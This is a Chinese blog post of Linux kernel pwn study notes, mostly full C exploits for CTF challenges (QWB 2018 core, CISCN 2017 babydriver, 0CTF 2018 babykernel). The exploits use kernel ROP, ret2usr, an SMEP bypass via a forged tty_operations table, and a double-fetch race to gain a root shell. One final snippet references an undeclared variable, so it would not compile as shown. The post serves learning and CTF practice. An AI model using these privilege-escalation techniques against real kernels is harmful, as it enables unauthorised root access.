---
title: kernel学习
date: 2021-12-18 19:58:44
tags:
---

### 收集信息

> 内核态与用户态是操作系统的两种运行级别,跟intel cpu没有必然的联系, intel cpu提供Ring0-Ring3三种级别的运行模式，Ring0级别最高，Ring3最低。Linux使用了Ring3级别运行用户态，Ring0作为 内核态，没有使用Ring1和Ring2。Ring3状态不能访问Ring0的地址空间，包括代码和数据。Linux进程的4GB地址空间，3G-4G部 分大家是共享的，是内核态的地址空间，这里存放在整个内核的代码和所有的内核模块，以及内核所维护的数据。用户运行一个程序，该程序所创建的进程开始是运 行在用户态的，如果要执行文件操作，网络数据发送等操作，必须通过write，send等系统调用，这些系统调用会调用内核中的代码来完成操作，这时，必 须切换到Ring0，然后进入3GB-4GB中的内核地址空间去执行这些代码完成操作，完成后，切换回Ring3，回到用户态。这样，用户态的程序就不能 随意操作内核地址空间，具有一定的安全保护作用。




```Powershell
$ uname -a
Linux ubuntu 4.15.0-142-generic #146~16.04.1-Ubuntu SMP Tue Apr 13 09:27:15 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

$ strings bzImage | grep gcc
4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017
```



* 文件系统

`cpio -i --no-absolute-filenames -F ../rootfs.cpio`

`find . | cpio -o --format=newc > ../rootfs.cpio`

* 获取符号信息

`grep -wE '_text|prepare_kernel_cred|commit_creds' /proc/kallsyms ; lsmod `

* 寻找gadget


1. `ropper --file vmlinux --search "pop|ret"`

2. `objdump -d vmlinux -M intel | grep -E 'ret|pop'`

3. `print("".join(hex(_)+"\n" for _ in vm.search(asm("pop rsi;ret",arch="amd64"))))`

* 写入的gadget

可以用于修改modprobe_path


1. `grep -E 'mov qword ptr \[r.x\], r.x ; ret' gadget`

2. `grep -E 'mov .* \[.*], .* ; .*ret' gadget`

### busybox文件系统

make menuconfig

打开 

* `Settings -> ---Build Option -> Build static binary (no shared library)`

关闭

* `Linux system utilities -> support mounting NFS file system in Linux`
* `Networking utilities -> inetd `

### 内核编译

可能的依赖 
* `sudo apt-get install make gcc bison flex libssl-dev ncurses-dev` 

* `make menuconfig`
一切默认
* `make bzImage`


### 习题-Kerenl-ROP

* 2018强网杯-pwn-core

```c
// gcc -o mypoc -static -w mypoc.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

uint64_t user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
 	printf("[*] save_stats\n\n");
}

void shell()
{
	if(getuid()==0)
	{
		system("/bin/sh");
	}
	printf("[!] No root shell");
}

void setoff(int fd,int off)
{
	ioctl(fd,0x6677889C,off);	
}

void core_read(int fd,char buf[])
{
	ioctl(fd,0x6677889B,buf);
}

void core_write(int fd,char *ptr,int size)
{
	write(fd,ptr,size);
}

void core_copy(int fd, uint64_t size)
{
	ioctl(fd,0x6677889A,size);	
}
int main()
{
	int i;
	int fd;
	char buf[0x40];
	uint64_t *buff=(uint64_t*)buf;
	uint64_t canary;
	uint64_t D_base;
	uint64_t K_base;
	uint64_t commit_creds;
	uint64_t prepare_kernel_cred;
	uint64_t *payload;

	save_stats();
	memset(buf,0,0x40);
	fd = open("/proc/core",O_RDWR);
	if(fd == -1)
	{
		printf("[!] open fails!");
		exit(-1);
	}
	setoff(fd,0x40);
	core_read(fd,buf);
/*
	for(int i=0;i<8;i++)
	{
		printf("buf[%d] => %p\n",i,buff[i]);
	}

*/
	canary = buff[0];
	D_base = buff[2] - 0x19b;
	K_base = buff[4] - 0x1dd6d1;

#define D(addr) (uint64_t)((D_base)+(addr))
#define K(addr) (uint64_t)((K_base)+(addr)-(0xFFFFFFFF81000000))

	commit_creds = K(0xffffffff8109c8e0);
	prepare_kernel_cred = K(0xffffffff8109cce0);
	
	printf("[+] canary => 0x%llx\n",canary);
	printf("[+] D_base => 0x%llx\n",D_base);
	printf("[+] K_base => 0x%llx\n",K_base);
	printf("[+] c_cred => 0x%llx\n",commit_creds);
	printf("[+] p_cred => 0x%llx\n",prepare_kernel_cred);
	// getchar();

	payload = malloc(0x800);
	memset(payload,0,0x800);
	
	for(i=0;i<8;i++)
	{
		payload[i]=0;
	}

	payload[i++] = canary;
	payload[i++] = 0;							//fake rbx
	payload[i++] = K(0xffffffff81126515);		//ret => pop rdi;ret
	payload[i++] = 0;
	payload[i++] = prepare_kernel_cred;
	
	payload[i++] = K(0xffffffff81394aab);		// pop rdx; ret
	payload[i++] = K(0xffffffff81394aab);		// pop rdx; ret
	
	payload[i++] = K(0xffffffff816dbd23);		// mov rdi, rax; call rdx
	payload[i++] = commit_creds;				
	payload[i++] = K(0xffffffff81a012da);		// swapgs ;popfq; ret
	payload[i++] = 0;				
	payload[i++] = K(0xffffffff81050ac2);		//iretq; ret				
	payload[i++] = (uint64_t)shell;	
	payload[i++] = user_cs;	
	payload[i++] = user_eflags;	
	payload[i++] = user_sp;	
	payload[i++] = user_ss;	


	core_write(fd,payload,0x800);
	core_copy(fd,0xf000000000000000+30*8);
	
	return 0;
}
```

第一道复现出来的kernel pwn，对题目中几点记录

* save_stats函数

asm函数的那部分具体汇编如此。
```Bash
   0x400b71 <save_stats+4>:	mov    rsi,cs
   0x400b74 <save_stats+7>:	mov    rcx,ss
   0x400b77 <save_stats+10>:	mov    rax,rsp
   0x400b7a <save_stats+13>:	pushf  
   0x400b7b <save_stats+14>:	pop    rdx
   0x400b7c <save_stats+15>:	mov    QWORD PTR [rip+0x2bc9ad],rsi        # 0x6bd530 <user_cs>
   0x400b83 <save_stats+22>:	mov    QWORD PTR [rip+0x2bc996],rcx        # 0x6bd520 <user_ss>
   0x400b8a <save_stats+29>:	mov    QWORD PTR [rip+0x2bc997],rdx        # 0x6bd528 <user_eflags>
   0x400b91 <save_stats+36>:	mov    QWORD PTR [rip+0x2bc9a0],rax        # 0x6bd538 <user_sp>

```

* swapgs指令
> use swapgs in the kernel's syscall entry point handler, then use GS segment overrides on some loads and stores like you would for thread-local storage, so the previously-hidden gs.base is used with the [base + idx*scale] addressing mode you use in each load or store instruction. e.g. something like mov [gs:0x10], rsp to save the user-space stack pointer and mov rsp, [gs:0x18] to load the kernel stack pointer.

> swapgs exists because syscall doesn't change RSP to point at the kernel stack (and doesn't save the user-space RSP anywhere). So you need some kind of thread-local (or actually core-local) storage so each core can get the right kernel stack pointer for the task running on that core. The hidden GS base is storage for that hidden pointer, and a way to use it without destroying the values of any architectural registers.

* `mov rdi, rax; call rdx` gadget的注意点

`call rdx`，执行时会把call之后的指令，push进栈。所以只需要把`call rdx`与`pop reg;ret`结合，pop reg会把push进去的pop出来从而恢复栈，再执行ret，从而使得rop正常执行。

* pack.sh

```Bash
#!/bin/sh
gcc -o mypoc -static -w mypoc.c -g
cp mypoc extract/
cd extract/
find . | cpio -o --format=newc > ../core.cpio
cd ../
```

### 习题-Kerenl-ret2usr

ring0的特权，可以执行用户空间的函数。可以代替构造ROP来

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

uint64_t user_cs, user_ss, user_eflags,user_sp;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
 	printf("[*] save_stats\n");
}
void shell()
{
	if(getuid()==0)
	{
		system("/bin/sh");
	}
	printf("[!] No root shell");
}

void setoff(int fd,int off)
{
	ioctl(fd,0x6677889C,off);	
}

void core_read(int fd,char buf[])
{
	ioctl(fd,0x6677889B,buf);
}

void core_write(int fd,char *ptr,int size)
{
	write(fd,ptr,size);
}

void core_copy(int fd, uint64_t size)
{
	ioctl(fd,0x6677889A,size);	
}
void (*c)(uint64_t);
uint64_t (*p)(uint64_t);

void getRoot()
{
	c(p(0));
}
int main()
{
	int i;
	int fd;
	char buf[0x40];
	uint64_t *buff=(uint64_t*)buf;
	uint64_t canary;
	uint64_t D_base;
	uint64_t K_base;
	uint64_t commit_creds;
	uint64_t prepare_kernel_cred;
	uint64_t *payload;

	save_stats();
	memset(buf,0,0x40);
	fd = open("/proc/core",O_RDWR);
	if(fd == -1)
	{
		printf("[!] open fails!");
		exit(-1);
	}
	setoff(fd,0x40);
	core_read(fd,buf);
/*
	for(int i=0;i<8;i++)
	{
		printf("buf[%d] => %p\n",i,buff[i]);
	}
*/
	canary = buff[0];
	D_base = buff[2] - 0x19b;
	K_base = buff[4] - 0x1dd6d1;

#define D(addr) (uint64_t)((D_base)+(addr))
#define K(addr) (uint64_t)((K_base)+(addr)-(0xFFFFFFFF81000000))

	commit_creds = K(0xffffffff8109c8e0);
	prepare_kernel_cred = K(0xffffffff8109cce0);
	
	c = commit_creds;
	p = prepare_kernel_cred;

	printf("[+] canary => 0x%llx\n",canary);
	printf("[+] D_base => 0x%llx\n",D_base);
	printf("[+] K_base => 0x%llx\n",K_base);
	printf("[+] c_cred => 0x%llx\n",commit_creds);
	printf("[+] p_cred => 0x%llx\n",prepare_kernel_cred);
	// getchar();

	payload = malloc(0x800);
	memset(payload,0,0x800);
	
	for(i=0;i<8;i++)
	{
		payload[i]=0;
	}

	payload[i++] = canary;
	payload[i++] = 0;							//fake rbx
	payload[i++] = (uint64_t)getRoot;
	payload[i++] = K(0xffffffff81a012da);		// swapgs ;popfq; ret
	payload[i++] = 0;				
	payload[i++] = K(0xffffffff81050ac2);		//iretq; ret				
	payload[i++] = (uint64_t)shell;	
	payload[i++] = user_cs;	
	payload[i++] = user_eflags;	
	payload[i++] = user_sp;	
	payload[i++] = user_ss;	


	core_write(fd,payload,0x800);
	core_copy(fd,0xf000000000000000+30*8);
	
	return 0;
}
```

* 说明下函数指针。

声明时可以`ret_type (*ptr)(agrv_type,...);`

赋值时可以`ptr = fun;` 或者 `ptr = &fun;`

调用时可以`ptr(argv);` 或者 `(*ptr)(argv);`

编译器不比人愚蠢，以上方式是能够分辨出来的。

另外在执行shellcode时就可以 `((void (*)(void))shellcode)()`;

### 习题-ciscn2017-babydriver

* poc

```c
#include <stdio.h>
#include <fcntl.h>

int main()
{
	int fd1;
	int fd2;
	int pid;
	char* buf;

	fd1 = open("/dev/babydev",2);
	fd2 = open("/dev/babydev",2);
	if(fd1<0||fd2<0)
	{
		printf("[*] open failure !");
		exit(-1);
	}
	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	pid = fork();
	if(pid==0)
	{
		printf("[*] child process created ");
		buf = malloc(0xa8);
		memset(buf,0,0xa8);
		write(fd2,buf,5*0x8);
		printf("[*] uid => %d\n",getuid());
		if(getuid()==0)
		{
			system("/bin/sh");
			exit(0);
		}
	}
	else
	{
		wait(0);
	}

	return 0;
}

/*
#define O_ACCMODE   00000003  
#define O_RDONLY    00000000  
#define O_WRONLY    00000001  
#define O_RDWR      00000002 
*/
```
* 说明

poc的关键在于fork函数要复制父进程的资源，重新创建`struct cred`结构体，其中的调用链如下

`entry_SYSCALL_64() -> SyS_clone() -> _do_fork -> copy_process() -> copy_creds() -> prepare_creds()`

* 关于`fork()`函数

这个测试文档去理解很不错
```c
#include <unistd.h>  
#include <stdio.h>   
int main ()   
{   
    int fpid;
    int count=0;  
    fpid=fork();   
    if (fpid < 0)   
        printf("error in fork!");   
    else if (fpid == 0) {  
        printf("[*] fpid = %d i am the child process, my process id is %d\n",fpid,getpid());   
        count++;  
    }  
    else {  
        printf("[*] fpid = %d i am the parent process, my process id is %d\n",fpid,getpid());   
        count++;  
    }  
    printf("count => %d\n",count);  
    return 0;  
} 
```

>RETURN VALUE:
       On  success, the PID of the child process is returned in the parent, and 0 is returned in the child.  On
       failure, -1 is returned in the parent, no child process is created, and errno is set appropriately.

* poc2 => bypass_smep

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>

unsigned long long user_cs, user_ss, user_rflags, user_sp;
void* (*prepare_kernel_cred)(void*) = 0xffffffff810a1810;
void  (*commit_creds)(void*) = 0xffffffff810a1420;

void save_stats() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}
void usergadget()
{
    commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq   %0;"
		"pushq   %1;"
		"pushq   %2;"
		"pushq   %3;"
		"pushq   $shell;"
		"pushq   $0;"
		"swapgs;"
		"popq    %%rbp;"
		"iretq;"
		::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs)
	);
}

void shell()
{
	if(getuid()==0)
	{
		system("/bin/sh");
	}
	printf("[!] No root shell");
}

int main()
{
	int fd1;
	int fd2;
	int fd;
	void* before;
	void* after;
	void** buf;
	void** vft;

	save_stats();
	fd1 = open("/dev/babydev",2);
	fd2 = open("/dev/babydev",2);
	if(fd1<0||fd2<0)
	{
		printf("[*] open failure !");
		exit(-1);
	}
	ioctl(fd1,0x10001,0x2e0);
	close(fd1);

	read(fd2,&before,8);
	fd = open("/dev/ptmx",2);
	read(fd2,&after,8);
	if(after==before)
	{
		printf("[!] not work");
		exit(-1);
	}

	buf = malloc(0x2e8);
	vft = malloc(0X20*0X1000);

	read(fd2,buf,0x8*4);
	buf[3] = (void*)vft;
	write(fd2,buf,0x8*4);
	vft[0] = 0xffffffff81009ad3;  // add rsp,0x40;pop 6reg;ret
	vft[7] = 0xffffffff8100008a;  //xchg esp,eax;ret
	
	int i=0xf;
	vft[i++] = 0xffffffff810d238d;
	vft[i++] = 0x6f0;
	vft[i++] = 0xffffffff81004d80;
	vft[i++] = 0;
	vft[i++] = usergadget;

	write(fd,&vft,1);
	return 0;
}
```

* 说明

1. 在调用虚表中的函数时 `write(fd,&vft,1)`,在汇编层面是，`0xffffffff814dc0c3:	call   QWORD PTR [rax+0x38]`，（怎麽测试出来的？填入一个非法地址，之后backtrace） 其中rax就是我们伪造虚表结构体的地址，而在`rax+0x38`处放置`xchg esp,eax;ret`，此时rsp的高位会置零，低位变成rax的低位。所以若rax本来高位就是零，那么rsp就会变成`rax+0`的值,栈迁移之后便可rop。如何申请到只有低32位的地址，用mmap肯定是可以的，但是我没测试成功，反而用malloc也申请到的只有低32位的地址，便用malloc来代替。

2. 关于ret2usr的思想，把全部需要的gadget都放在用户空间，简化了构造rop的难度。

3. 如何获取某个结构体大小，当然要用有符号的vmlinux，也可以从源码中摘出来手动编译，但可能有些类型无法识别。

```Powershell
gef➤  p sizeof(struct tty_operations)
$1 = 0x110
gef➤  p sizeof(struct tty_struct)
$2 = 0x2e0
```
4. 在我编译的bzImage中我并没有测试通过uaf劫持虚表结构体那个方法，可能这道题是特意构造的。

### 习题2018-0CTF-Finals-BabyKernel 

* Double fetch 

```c
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/ioctl.h>

struct user_flag
{
	char *flag;
	int len;
};
struct user_flag* buf;

int fd;
char *tmp;
int done = 0;
unsigned long long flag_addr;

unsigned long long getaddr()
{
	FILE *stream;
    char *line = NULL;
   	size_t len = 0;
	char *flag = NULL;
	unsigned long long result = 0;

	system("dmesg > /tmp/text");
	stream = fopen("/tmp/text", "r");
	if (stream == NULL)
    	exit(EXIT_FAILURE);
	while (getline(&line, &len, stream) != -1) 
	{
		flag = strstr(line,"Your flag is at");
		if(flag)
		{
			sscanf(flag,"Your flag is at %llx!",&result);
			break;
		}

	}
   free(line);
   fclose(stream);
   return result;
}

char *getflag()
{
	FILE *stream;
    char *line = NULL;
   	size_t len = 0;
   	char* result;

	system("dmesg > /tmp/text");
	stream = fopen("/tmp/text", "r");
	if (stream == NULL)
    	exit(EXIT_FAILURE);
	while (getline(&line, &len, stream) != -1) 
	{
		result = strstr(line,"So here is it");
		if(result) break;
	}
   fclose(stream);
   return result;
}

void race_condition_user()
{
	while(!done)
	{
		buf->flag = flag_addr;
	}
}
void race_condition_kernel()
{
	for(int i=0;i<0x1000;i++)
	{
		if(ioctl(fd,0x1337,buf)==0)
		{
			printf("[+] Done at %d times\n",i+1);
			break;
		}
		buf->flag = tmp;
	}
	done = 1;
}


int main()
{
	pthread_t pt1;
	pthread_t pt2;

	if((fd = open("/dev/baby",2))<0)
	{
		printf("[!] open failure");
	}


	ioctl(fd,0x6666,1);
	flag_addr = getaddr();
	printf("[+] flag addr => 0x%llx\n",flag_addr);

	buf = malloc(sizeof(struct user_flag));
	buf->flag = malloc(0x30);
	tmp = buf->flag;

	for(int i=1;i<0x100;i++)
	{
		buf->len = i;
		if(ioctl(fd,0x1337,buf) != 14)
		{
			printf("[+] flag length => %d\n",buf->len);
			break;
		}
	}

	pthread_create(&pt2,NULL,race_condition_kernel,NULL);
	pthread_create(&pt1,NULL,race_condition_user,NULL);

	pthread_join(pt1,NULL);
	pthread_join(pt2,NULL);

	printf("[+] %s\n",getflag());

	return 0;
}


```

* 说明

1. 这是条件竞争的一种，用户态线程A和内核态线程B竞争用户空间的资源，当线程B完整验证之后，线程A修改了储存在用户空间的验证条件。
2. `-smp cores=1,threads=1 `其他类型的题boot.sh是这样的参数，`-smp 2,cores=2,threads=1`，这个条件竞争题目给的是这个。我也查了一些资料，但是我OS学识尚浅，不能在多核，进程，线程给出本题目的论断。
3. 我使用fork创建一个进程去竞争资源（是符合直觉的）是不可行性，应该是因为fork后进行了资源copy，fork出的进程的用户空间是独立的，也就不存在竞争了。


* poc2

在mmap映射的地址边缘尝试，通过是否触发kernel panic，来判断是否正确。
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/ioctl.h>

struct user_flag
{
	char *flag;
	int len;
};
struct user_flag* buf;

int main()
{

	int fd;
	char *p;
	if((fd = open("/dev/baby",2))<0)
	{
		printf("[!] open failure");
	}

	buf = malloc(sizeof(struct user_flag));
	buf->flag = malloc(0x30);
	tmp = buf->flag;

	for(int i=1;i<0x100;i++)
	{
		buf->len = i;
		if(ioctl(fd,0x1337,buf) != 14)
		{
			printf("[+] flag length => %d\n",buf->len);
			break;
		}
	}
	p = mmap((void*)0x500000,0x1000,7,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);

	int crack = 9;
	p = p+0x1000-crack;
	p[0] = 'f';
	p[1] = 'l';
	p[2] = 'a';
	p[3] = 'g';
	p[4] = '{';
	p[5] = 'T';
	p[6] = 'H';
	p[7] = 'I';
	buf->flag = p;
	for(int i =32; i< 127;i++)
	{
		p[crack-1] = (char)(i);
		printf("[+]  %c => 0x%x\n",i+1,ioctl(fd,0x1337,buf));
	}

	return 0;
}


```


